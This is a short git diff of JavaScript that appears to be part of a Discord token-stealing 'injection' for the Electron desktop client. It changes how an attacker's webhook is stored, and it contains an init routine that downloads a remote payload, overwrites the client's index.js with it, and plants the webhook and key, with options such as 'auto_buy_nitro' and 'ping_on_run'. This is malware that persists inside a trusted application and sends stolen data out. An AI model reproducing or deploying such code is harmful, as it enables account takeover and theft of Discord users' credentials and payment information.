@@ -4,10 +4,9 @@ const path = require('path');
 const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
-const encodedHook = '%WEBHOOKHEREBASE64ENCODED%'
 
 const config = {
-  webhook: atob(encodedHook),
+  webhook: '%WEBHOOK%', 
   webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false, 
   ping_on_run: true, 
@@ -444,7 +443,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOKHEREBASE64ENCODED%', '${encodedHook}')
+        res.replace('%WEBHOOKHEREBASE64ENCODED%', '${config.webhook}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
